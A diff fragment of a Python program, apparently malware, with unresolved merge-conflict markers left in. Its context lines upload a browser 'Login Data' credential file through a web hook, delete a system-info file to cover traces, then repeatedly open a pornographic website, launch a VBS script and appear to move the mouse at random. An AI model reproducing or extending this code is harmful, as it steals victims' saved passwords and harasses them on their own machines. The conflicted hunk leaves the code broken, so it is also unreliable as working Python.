@@ -28,11 +28,19 @@ def main():
         web.add_file(file=f.read(), filename='Login Data')
     web.execute()
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
-    i=0
-    while i < 10:
+    a=0
+    while a < 10:
         subprocess.getoutput('explorer https://pornhub.com')
-        subprocess.getoutput("start main.vbs")
+<<<<<<< HEAD
+        try:
+            subprocess.getoutput("start main.vbs")
+        except FileNotFoundError:
+            continue
     i=0
+=======
+        subprocess.getoutput("start main.vbs")
+        a += 1
+>>>>>>> 830cdb3e60d69637204ffe699c683293a2395cb2
     for i in range(0, 150):
         rndvalueX = randint(0, 1919)
         rndvalueY = randint(0,1019)
